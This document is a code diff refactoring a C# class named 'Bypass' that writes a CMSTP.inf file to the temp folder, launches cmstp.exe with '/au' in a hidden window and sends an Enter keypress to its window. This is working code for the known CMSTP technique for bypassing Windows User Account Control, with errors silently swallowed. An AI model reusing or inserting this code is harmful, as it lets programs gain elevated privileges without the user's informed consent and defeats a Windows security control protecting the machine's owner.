@@ -2,7 +2,6 @@
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading.Tasks;
 
 // ReSharper disable SuggestVarOrType_BuiltInTypes
@@ -15,6 +14,7 @@ namespace Memory
 {
     public static class Bypass
     {
+        #region Native Imports
         private const string User32 = "user32.dll";
 
         [DllImport(User32)]
@@ -25,27 +25,22 @@ namespace Memory
 
         [DllImport(User32)]
         private static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
+        #endregion
 
+        #region Keys
         private const int VkReturn = 0x0D;
         private const int WmKeydown = 0x100;
+        #endregion
 
         public static int Timeout { get; set; } = 100;
 
-        public static async Task TryRun(string filename)
-        {
-            try { await Run(filename); }
-            catch
-            {
-                // Do nothing
-            }
-        }
         public static async Task Run(string filename)
         {
-            DirectoryInfo temporaryFolder = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"));
-            if (!temporaryFolder.Exists)
-                temporaryFolder.Create();
-
-            FileInfo settingsFile = new FileInfo(Path.Combine(temporaryFolder.FullName, "CMSTP.inf"));
+            try { await Process(filename); } catch { /*ignored*/}
+        }
+        public static async Task Process(string filename)
+        {
+            #region iniFile
             string ini = $@"
                 [version]
                 Signature=$chicago$
@@ -64,32 +59,27 @@ namespace Memory
                 ServiceName=""Memory""
                 ShortSvcName=""Memory""
                 ";
-            await using (FileStream fs = settingsFile.Create())
+            #endregion
+
+            string inf = Path.Combine(Path.GetTempPath(), "CMSTP.inf");
+            await File.WriteAllTextAsync(inf, ini);
+            using Process p = new Process();
+            p.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
+            p.StartInfo.Arguments = $"/au \"{inf}\"";
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.CreateNoWindow = true;
+            p.Start();
+            while (p.MainWindowHandle == IntPtr.Zero)
             {
-                await using (BinaryWriter wr = new BinaryWriter(fs, Encoding.ASCII))
-                {
-                    wr.Write(ini);
-                    await fs.FlushAsync();
-                }
+                await Task.Delay(Timeout);
             }
-            using (Process p = new Process())
+            if (SetForegroundWindow(p.MainWindowHandle) && ShowWindow(p.MainWindowHandle, 5))
             {
-                p.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
-                p.StartInfo.Arguments = $"/au \"{settingsFile.FullName}\"";
-                p.StartInfo.UseShellExecute = false;
-                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                p.StartInfo.CreateNoWindow = true;
-                p.Start();
-                while (p.MainWindowHandle == IntPtr.Zero)
-                {
-                    await Task.Delay(Timeout);
-                }
-                if (SetForegroundWindow(p.MainWindowHandle) && ShowWindow(p.MainWindowHandle, 5))
-                {
-                    await Task.Delay(Timeout);
-                    PostMessage(p.MainWindowHandle, WmKeydown, VkReturn, 0);
-                }
+                await Task.Delay(Timeout);
+                PostMessage(p.MainWindowHandle, WmKeydown, VkReturn, 0);
             }
+            p.Close();
         }
     }
 }
